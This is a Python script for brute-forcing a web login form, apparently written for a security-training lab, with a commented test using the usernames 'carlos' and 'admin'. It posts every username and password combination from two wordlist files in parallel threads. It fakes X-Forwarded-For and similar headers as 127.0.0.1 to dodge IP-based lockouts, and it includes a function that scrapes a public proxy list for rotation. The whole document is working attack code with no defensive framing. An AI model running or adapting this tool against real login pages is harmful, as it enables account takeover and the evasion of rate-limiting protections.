import requests
import threading
from bs4 import BeautifulSoup                                                           
from time import sleep
import random

headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml',
        "Cookie": "session=xAxPv4Zwe9rMb9wCLsbOqXI3CVvPzPu5",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Originating-IP": "127.0.0.1",
        "X-Forwarded-For": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1",
        }
csrf= "FEsuGp2F4KHtrpNy4N7xZEFJisCcyXK9" 
cuid = ""
cpassw = ""
def sendreq(url,passw,uid):
    global cpassw
    res = ""
    try:
        #print(random.choice(iplist))
        #print("Ruko Zara Sabar Karo")
        res=requests.post(url,data={
            "csrf": csrf,
            "username": uid,
            "password": passw
        }, headers=headers).text
    except Exception as e:
        print(e)
        res = ""
    #print(res)
    if res and "Invalid username or password." not in res and "<body>" in res:
        print("uid-",uid)
        print("pass-",passw)
        print(res)
        #cpassw = passw
        #s_th = True

def sendreqfindUID(url,passw,uid):
    global cuid
    print(uid)
    res = ""
    try:
        res=requests.post(url,data={
            "csrf": csrf,
            "username": uid,
            "password": passw
        }, headers=headers).text
    except Exception as e:
        print(e)
        res = ""
    #print(res)
    if res and cuid == "" and "Invalid username" not in res:
        print("uid-",uid)
        print(res)
        cuid = uid
        #s_th = True

def getIPs():
    response = requests.get("https://sslproxies.org/") 
    soup = BeautifulSoup(response.content, 'html5lib') 
    ips = [ip.text for ip in soup.findAll('td')[::8]]
    ports = [port.text for port in soup.findAll('td')[1::8]]
    IPList = [ips[i]+":" + ports[i] for i in range(len(ips))]
    IPList = [proxy for proxy in IPList if proxy[0].isnumeric()]
    print()
    return IPList

def func(url,uids,passlist):
    res= 0
    i = 0
    #print("finding uid and pass")
    #for uid in uids:#5
        #print(uid)
    #    t = threading.Thread(target=sendreqfindUID, args=(url, "Test", uid))
    #    t.start()
    #print("Get Ps")
    #for passw in passlist:         
    #    i+=1
        #print(passw)
        #t = threading.Thread(target=sendreq, args=(url, passw, cuid))
        #t.start()
            #T.append(t)
    for uid in uids:
        T =[]
        for passw in passlist:
            t = threading.Thread(target=sendreq, args=(url, passw, uid))
            t.start()
            T.append(t)
        for t in T:
            t.join()



            


url = ""

with open("ID.txt", "r") as f:
    uids = f.readlines()
    uids = [uid[:-1] for uid in uids]
    uids = uids[:-1]
with open("pass.txt", "r") as f:
    passlist = f.readlines()
    passlist = [passw[:-1] for passw in passlist]
    passlist = passlist[:-1]

print("getting IPS")
iplist = [1]#getIPs()
print("IPs recieved")
func(url,uids,passlist)
#sendreq(url,"carlos","admin")

